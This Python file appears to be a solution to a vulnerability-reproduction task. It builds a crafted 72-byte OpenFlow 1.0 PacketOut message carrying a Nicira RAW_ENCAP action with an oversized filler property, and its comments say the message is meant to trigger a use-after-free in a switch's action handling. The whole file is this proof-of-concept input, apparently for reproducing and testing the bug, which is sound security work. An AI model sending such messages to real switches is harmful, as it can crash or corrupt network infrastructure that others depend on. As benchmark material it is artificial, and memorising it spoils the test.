import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Construct a 72-byte OpenFlow 1.0 PacketOut message
        # containing an NXAST_RAW_ENCAP action to trigger the UAF.

        # 1. OpenFlow 1.0 Header (8 bytes)
        # Version: 1
        # Type: 13 (PACKET_OUT)
        # Length: 72
        # XID: 1
        of_header = struct.pack("!BBHI", 1, 13, 72, 1)

        # 2. PacketOut Body (8 bytes)
        # Buffer ID: -1 (None)
        # In Port: 65535 (None)
        # Actions Length: 56 (72 total - 16 header)
        po_body = struct.pack("!IHH", 0xFFFFFFFF, 0xFFFF, 56)

        # 3. Action: NXAST_RAW_ENCAP (16 bytes header)
        # Type: 0xFFFF (Vendor)
        # Length: 56 (Header + Properties)
        # Vendor: 0x00002320 (Nicira)
        # Subtype: 46 (RAW_ENCAP)
        # Pad: 6 bytes
        action_header = struct.pack("!HHIH", 0xFFFF, 56, 0x00002320, 46) + b'\x00' * 6

        # 4. Action Properties (40 bytes)
        # We supply a property large enough to potentially trigger reallocation
        # in the internal buffer handling.
        # Property: Type=0, Length=40, Value=36 bytes
        prop_header = struct.pack("!HH", 0, 40)
        prop_payload = b'\x42' * 36

        # Total length: 8 + 8 + 16 + 4 + 36 = 72 bytes
        return of_header + po_body + action_header + prop_header + prop_payload
